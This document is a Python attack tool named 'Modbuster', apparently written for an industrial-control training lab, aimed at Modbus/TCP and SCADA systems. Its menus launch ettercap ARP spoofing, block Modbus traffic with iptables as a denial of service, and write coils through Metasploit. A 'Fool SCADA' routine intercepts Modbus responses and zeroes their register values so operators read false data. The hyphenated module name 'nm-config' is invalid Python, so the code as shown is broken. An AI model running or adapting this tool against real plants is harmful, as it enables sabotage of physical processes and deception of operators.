import os
import subprocess
os.sys.path.append('/usr/bin/')
os.sys.path.append('/usr/local/lib/python2.7/site-packages')
import scapy.all
import time
import sys
import imp
import netfilterqueue
import nm-config
import fileinput
from nm-config import *
from os import system
from scapy.all import *
from netfilterqueue import NetfilterQueue
	
def editsettings():
	print ("\nSelected option: Change Default Settings\n")
	with open('nm-config.py', 'r') as f:
		print(f.read())
	f.close()

	print("\n\nSelect a setting to change\n")
	print("1) SCADA IP")
	print("2) SCADA MAC")
	print("3) Modbus Client IP")
	print("4) Modbus Client MAC")
	print("5) Modbus Port")
	print("q) Return to Main Menu")
	select = input(">> ")
	
	
	
	if select == "1":
		temp = input("Type in new SCADA IP: ")
		
		f = open('nm-config.py', 'r')
		filedata = f.read()
		f.close()
		
		newdata = filedata.replace(nm-config.scada_ip, temp)
		
		f = open('nm-config.py', 'w')
		f.write(newdata)
		f.close()

		
		editsettings()
	elif select == "2":
		temp = input("Type in new SCADA MAC: ")
		
		f = open('nm-config.py', 'r')
		filedata = f.read()
		f.close()
		
		newdata = filedata.replace(nm-config.scada_mac, temp)
		
		f = open('nm-config.py', 'w')
		f.write(newdata)
		f.close()
		editsettings()
	elif select == "3":
		temp = input("Type in new Modbus Client IP: ")
		
		f = open('nm-config.py', 'r')
		filedata = f.read()
		f.close()
		
		newdata = filedata.replace(nm-config.modcli_ip, temp)
		
		f = open('nm-config.py', 'w')
		f.write(newdata)
		f.close()
		editsettings()
	elif select == "4":
		temp = input("Type in new Modbus Client MAC: ")
		
		f = open('nm-config.py', 'r')
		filedata = f.read()
		f.close()
		
		newdata = filedata.replace(nm-config.modcli_mac, temp)
		
		f = open('nm-config.py', 'w')
		f.write(newdata)
		f.close()
		editsettings()
	elif select == "5":
		temp = input("Type in new Modbus Port: ")
		f = open('nm-config.py', 'r')
		filedata = f.read()
		f.close()
		
		newdata = filedata.replace(nm-config.mod_port, temp)
		
		f = open('nm-config.py', 'w')
		f.write(newdata)
		f.close()
		editsettings()
	elif select == "q":
		main()
	else:
		main()

def clear():
	system('clear')
	
def etterspoof():

	print("Checking ettercap...")
	if subprocess.getoutput("pgrep -x -c ettercap") == "0":
		print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
		
		
		subprocess.Popen("sudo qterminal -e \"sudo ettercap-pkexec -Tq -n 255.255.255.0 -i eth0 -M arp:remote "+ nm-config.scada_mac + "/"+ nm-config.scada_ip +"// "+ nm-config.modcli_mac +"/"+ nm-config.modcli_ip+"//\"", shell=True, preexec_fn=os.setpgrp)
	else:
		print("Ettercap is already running!")
		time.sleep(1)
	clear()
	main()
	
def redirect(packet):
	
	packet[IP].src = str(RandIP())
	
	if packet.haslayer(Raw):
	
		data = packet[Raw].load[:9] + 10*b'\x00' 
		
		packet[Raw].load = data


	sendp(packet, loop=0, count=5)
	print("Packet duplicated from " + packet[IP].src + " to " + packet[IP].dst)
	
	
	
def dos():
	def firewall():
		print ("Selected DoS variation: Modbus Firewall\n")
		print("Checking ettercap...")
		if subprocess.getoutput("pgrep -x -c ettercap") == "0":
			print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
			time.sleep(1)
			main()
		else:
			print("Ettercap is running!")
		time.sleep(0.5)
		
		print("Select a firewall state\n")
		print("1) On (Blocking Traffic)")
		print("2) Off (Return to default)")
		print("q) Return to DoS Menu")
		select = input(">> ")
		
		if(select == "1"):
			os.system("iptables -A OUTPUT -p tcp -s "+ nm-config.modcli_ip+" --sport "+ nm-config.mod_port +" -j DROP")
			main()
		elif(select == "2"):
			os.system("iptables -F")
			main()
		elif(select == "q"):
			dos()
		else:
			print("Invalid option, returning to menu")
			time.sleep(0.5)
			firewall()
	
	try:

	
	
		print ("Selected option: DoS Attack\n")
		time.sleep(0.5)
		
		print("Select an atttack variation\n")
		print("1) SYN Flood")
		print("2) Modbus Firewall (Requires MITM)")
		print("q) Return to Main Menu")
		select = input(">> ")
		
		if(select == "1"):
			print("\nNot yet implemented...sorry")
		elif(select == "2"):
			firewall()
		elif(select == "q"):
			main() 
		else:
			print("Invalid option, returning to menu")
			time.sleep(0.5)
			dos()
	
	except KeyboardInterrupt:
		print("Exiting...")
		time.sleep(0.5)
		main()
		pass
		
def traffic():

	def capture(packet):
	
		clear()
	
		print("Modbus Packet captured")
		hexdump(packet)
	
		print("\nPacket Raw Load\n")
		print(str(packet[Raw].load) + "\n")
		print("\n-------------------------------------------------------------\n")
		print("Press CTRL + C to Exit")

	try:
		sniff(filter="port "+ nm-config.mod_port +" and src host "+ nm-config.modcli_ip+"", prn=capture, store=0)
		main()
	except KeyboardInterrupt:
		print("Exiting...")
		time.sleep(0.5)
		main()
		pass
		
def test():
	try:
		sniff(store=0, prn=lambda x: x.summary())
		main()
	except KeyboardInterrupt:
		print("Exiting...")
		time.sleep(0.5)
		main()
		pass
		
def msfconsole():
	try:
		coil_address = input("Enter Coil Address: ")
		num_coils = int(input("Enter # of Coils: "))
		coil_data = ""
		for x in range(num_coils):
			coil_temp = input("Enter state[0/1] for Coil #" + str(x) + ": ")
			coil_data += coil_temp

		input("Press any key to send command...")
		print("Loading msfconsole with given parameters...")

		os.system("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm-config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"")
		main()
	except KeyboardInterrupt:
		print("Exiting...")
		time.sleep(0.5)
		main()
		pass

def nf():
	print("Checking ettercap...")
	
	if subprocess.getoutput("pgrep -x -c ettercap") == "0":
		print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
		time.sleep(1)
		main()
	else:
		print("Ettercap is running!\n")



	os.system("iptables -A OUTPUT -p tcp -s "+ nm-config.modcli_ip+" --sport "+ nm-config.mod_port +" -j NFQUEUE --queue-num 1")

	def callback(packet):
	
		
		pkt = IP(packet.get_payload())
		
		if pkt.haslayer(Raw) and len(pkt[TCP].payload) >= 80:
		
			clear()
			
			print("Modbus Response Packet Intercepted")
			
			hexdump(pkt)
			
			#print(pkt[Raw].load[7])
			
			bytecnt = pkt[Raw].load[8]
			
			
			#data = pkt[Raw].load[:9] + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 
			
			data = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
			
			pkt[Raw].load = data
			
			print("Registers cleared")
			hexdump(pkt)
			
			del pkt[IP].len
			del pkt[IP].chksum
			del pkt[TCP].chksum
		
		packet.drop()
		send(pkt)
		
		
		#packet.set_payload(bytes(pkt))
		
		#packet.accept()
		
	
	nfqueue = NetfilterQueue()
	nfqueue.bind(1, callback)
	try:
		print("Intercepting Packets...")
		nfqueue.run()
	except KeyboardInterrupt:
		print("Reseting iptables to default...")
		os.system("iptables -F")
		print("Exiting...")
		main()
		pass
	
	

	

def main():
	clear()
	print(""" 
---------------------------------------------
       __   __   __        __  ___  ___  __  
 |\/| /  \ |  \ |__) |  | /__`  |  |__  |__) 
 |  | \__/ |__/ |__) \__/ .__/  |  |___ |  \ 
                                             
---------------------------------------------
	
NCREPT ModbusTCP Python 3.9 Script
by Gideon
	
	\n""")
	
	time.sleep(0.5)
	
	print("Select a function from the options below\n")
	print("1) Write to Coils/Holding Registers")
	print("2) Fool SCADA ")
	print("3) DoS Attack")
	print("4) View ModbusTCP Traffic")
	print("5) Test Traffic Function (View All Traffic)")
	print("6) Enable ARP Spoofing")
	print("7) View/Change Default Settings ")
	print("q) Exit Modbuster")
	
	try:
	
		select = input(">> ")
		
		if(select == "1"):
			msfconsole()
		elif(select == "2"):
			nf()
		elif(select == "3"):
			dos()
		elif(select == "4"):
			traffic()
		elif(select == "5"):
			test()
		elif(select == "6"):
			etterspoof()
		elif(select == "7"):
			editsettings()
		elif(select == "q"):
			sys.exit(1)
		else:
			print("Invalid option\n")
			time.sleep(1.5)
			main()
	except KeyboardInterrupt:
		print("\nExiting...")
		sys.exit(1)
	

main()



